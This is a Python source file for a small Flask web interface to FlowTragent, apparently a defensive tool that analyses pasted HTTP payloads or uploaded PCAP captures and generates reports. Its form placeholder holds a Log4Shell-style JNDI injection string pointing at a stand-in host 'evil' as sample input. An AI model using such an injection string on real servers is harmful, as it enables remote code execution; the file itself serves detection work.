"""Minimal Flask UI for FlowTragent."""

from __future__ import annotations

from pathlib import Path

from flask import Flask, redirect, render_template_string, request, send_from_directory, url_for
from werkzeug.utils import secure_filename

from main import run_payload, run_pcap
from src.core.settings import load_config


app = Flask(__name__)
CONFIG = load_config()


PAGE = """
<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>FlowTragent</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 32px; color: #1f2933; }
    main { max-width: 920px; margin: 0 auto; }
    section { margin: 24px 0; padding: 20px; border: 1px solid #d8dee4; border-radius: 8px; }
    textarea { width: 100%; min-height: 130px; font-family: Consolas, monospace; }
    input, button { font-size: 14px; padding: 8px; }
    button { cursor: pointer; }
    .result { background: #f6f8fa; padding: 12px; border-radius: 6px; }
  </style>
</head>
<body>
<main>
  <h1>FlowTragent</h1>
  <section>
    <h2>Payload 分析</h2>
    <form method="post" action="/analyze-payload">
      <textarea name="payload" placeholder="GET /?x=${jndi:ldap://evil/a} HTTP/1.1 Host: victim"></textarea>
      <p>
        <label><input type="checkbox" name="demo_index" checked> demo index</label>
        <label><input type="checkbox" name="enable_rag" checked> RAG</label>
        <label><input type="checkbox" name="enable_ollama"> Ollama</label>
      </p>
      <button type="submit">生成报告</button>
    </form>
  </section>
  <section>
    <h2>PCAP 上传</h2>
    <form method="post" action="/analyze-pcap" enctype="multipart/form-data">
      <input type="file" name="pcap" accept=".pcap,.cap,.pcapng">
      <p>
        <label><input type="checkbox" name="demo_index" checked> demo index</label>
        <label><input type="checkbox" name="enable_rag" checked> RAG</label>
        <label><input type="checkbox" name="enable_ollama"> Ollama</label>
      </p>
      <button type="submit">上传并分析</button>
    </form>
  </section>
  {% if report %}
  <section class="result">
    <strong>报告已生成：</strong>
    <a href="{{ url_for('download_report', filename=report.name) }}">{{ report.name }}</a>
  </section>
  {% endif %}
</main>
</body>
</html>
"""


@app.get("/")
def index():
    return render_template_string(PAGE, report=None)


@app.post("/analyze-payload")
def analyze_payload():
    payload = request.form.get("payload", "").strip()
    if not payload:
        return redirect(url_for("index"))
    report = run_payload(
        payload,
        CONFIG,
        Path(CONFIG["paths"]["report_dir"]),
        int(CONFIG["retrieval"]["top_k"]),
        _checked("demo_index"),
        _checked("enable_rag"),
        _checked("enable_ollama"),
    )
    return render_template_string(PAGE, report=report)


@app.post("/analyze-pcap")
def analyze_pcap():
    upload = request.files.get("pcap")
    if upload is None or not upload.filename:
        return redirect(url_for("index"))
    filename = secure_filename(upload.filename)
    pcap_path = Path(CONFIG["paths"]["pcap_dir"]) / filename
    pcap_path.parent.mkdir(parents=True, exist_ok=True)
    upload.save(pcap_path)
    report = run_pcap(
        pcap_path,
        CONFIG,
        Path(CONFIG["paths"]["report_dir"]),
        int(CONFIG["retrieval"]["top_k"]),
        _checked("demo_index"),
        _checked("enable_rag"),
        _checked("enable_ollama"),
    )
    return render_template_string(PAGE, report=report)


@app.get("/reports/<path:filename>")
def download_report(filename: str):
    return send_from_directory(CONFIG["paths"]["report_dir"], filename, as_attachment=False)


def _checked(name: str) -> bool:
    return request.form.get(name) == "on"


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)

